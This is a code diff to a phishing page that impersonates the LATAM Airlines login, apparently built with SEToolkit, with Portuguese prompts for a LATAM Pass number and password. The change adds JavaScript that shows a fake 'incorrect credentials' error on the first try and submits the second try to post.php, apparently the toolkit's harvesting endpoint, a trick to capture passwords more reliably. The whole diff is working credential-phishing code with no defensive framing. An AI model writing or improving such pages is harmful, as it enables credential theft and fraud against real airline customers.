@@ -67,6 +67,8 @@
         }
     </style>
     <script>
+        let attemptCount = 0;
+
         function validateForm(event) {
             var username = document.forms["loginForm"]["username"].value;
             var password = document.forms["loginForm"]["password"].value;
@@ -74,13 +76,26 @@
             if (username === "" || password === "") {
                 event.preventDefault();
                 alert("Por favor, preencha todos os campos.");
+                return false;
             }
+
+            attemptCount++;
+
+            if (attemptCount === 1) {
+                event.preventDefault();
+                alert("Erro: Credenciais incorretas. Tente novamente.");
+                return false;
+            }
+
+            // If second attempt, allow form submission and redirect
+            document.forms["loginForm"].action = "post.php"; // Adjust to the actual path used by SEToolkit
+            return true;
         }
     </script>
 </head>
 <body>
     <div class="container">
-        <form name="loginForm" action="post.php" method="post" onsubmit="validateForm(event)">
+        <form name="loginForm" method="post" onsubmit="return validateForm(event)">
             <img src="https://th.bing.com/th/id/R.8c29d58fe7dc2c144922bc2c2c07d008?rik=9EVDOKvltMk8Kg&riu=http%3a%2f%2flogos-download.com%2fwp-content%2fuploads%2f2016%2f12%2fLATAM_Airlines_logo_wordmark.png&ehk=KoMMi4amEshpJz3dL4OUfFcHwZ%2b32OLiAE591EJWXs4%3d&risl=&pid=ImgRaw&r=0" alt="Logo da LATAM Airlines" class="logo">
             <p class="texto-superior">Insira seu usuário:</p>
             <p class="texto-inferior">Dê preferência ao seu número LATAM Pass ao inserir seus dados:</p>
